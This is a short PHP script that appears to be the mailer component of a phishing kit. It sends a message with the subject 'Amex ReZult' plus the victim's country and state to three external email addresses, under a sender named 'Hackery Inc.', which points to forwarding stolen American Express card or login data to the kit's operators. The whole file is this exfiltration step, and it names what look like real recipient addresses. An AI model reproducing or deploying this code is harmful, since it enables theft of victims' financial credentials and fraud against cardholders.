<?php

$to = "Dorisascotta@gmail.com, csmithpitt1964@outlook.com, Da4r74rel@gmail.com";
$subject = "Amex ReZult $country | $state";
$from = "From: Hackery Inc.<roberta.allwright@inbox.lv>";

mail($to,$subject,$msg,$from);

?>